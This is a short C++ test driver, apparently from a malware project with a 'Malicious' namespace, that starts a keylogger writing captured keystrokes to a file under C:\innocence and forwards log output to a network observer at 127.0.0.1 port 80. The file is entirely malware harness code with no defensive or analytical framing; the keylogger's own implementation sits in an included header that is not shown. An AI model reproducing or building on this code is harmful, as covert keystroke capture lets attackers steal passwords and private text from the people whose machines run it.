#include <cstdlib>
#include <iostream>
using namespace std;

#include <common/Log.hpp>
#include <malicious/Keylogger.hpp>
#include <system/Process.hpp>
#include <system/ProcessManager.hpp>
using namespace System;
using namespace Malicious;

int main()
{
    FUNC_LOG(__FUNCTION__);
	LOG.setHeader("TEST KEYHOOKER");
    LOG.addObserver(new Common::LogToConsole);
    LOG.addObserver(new Common::LogToNetwork("127.0.0.1", 80));
    Keylogger::instance().setKeylog("C:\\innocence\\output.txt");
    Keylogger::instance().start();
	system("pause");
	return EXIT_SUCCESS;
}
